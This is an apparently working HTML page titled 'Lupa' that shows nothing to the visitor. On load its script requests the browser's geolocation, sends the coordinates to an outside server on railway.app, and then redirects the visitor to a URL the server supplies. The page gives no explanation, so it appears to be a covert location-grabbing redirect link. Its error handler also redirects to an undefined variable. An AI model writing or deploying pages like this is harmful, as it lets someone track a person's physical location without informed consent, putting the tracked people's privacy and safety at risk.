<!DOCTYPE html>
<html>
<head>
    <title>Lupa</title>
</head>
<body>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(showPosition, showError);
            } else {
                console.log("Geolocalização não é suportada pelo seu navegador.");
            }
        }

        function showPosition(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;

            sendLocationToServer(latitude, longitude)
            .then(url => {
                window.location.href = url;
            })
            .catch(error => {
                console.error('Erro ao obter a URL:', error);
            });  
        }

        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    console.log("Usuário negou a solicitação de Geolocalização.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    console.log("Informações de localização não estão disponíveis.");
                    break;
                case error.TIMEOUT:
                    console.log("A solicitação para obter a localização expirou.");
                    break;
                case error.UNKNOWN_ERROR:
                    console.log("Ocorreu um erro desconhecido.");
                    break;
            }

            window.location.href = url;
        }

        function sendLocationToServer(latitude, longitude) {
            return new Promise((resolve, reject) => {
                <!-- fetch('http://localhost:8080/', { -->
                    fetch('https://getlocationgo-production.up.railway.app/', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        latitude: latitude,
                        longitude: longitude
                    }),
                })
                .then(response => response.json())
                .then(data => {
                    if (data.url) {
                        resolve(data.url);
                    } else {
                        reject('URL não encontrada na resposta');
                    }
                })
                .catch((error) => {
                    reject(error);
                });
            });
        }
        
        window.onload = getLocation;
    </script>
</body>
</html>
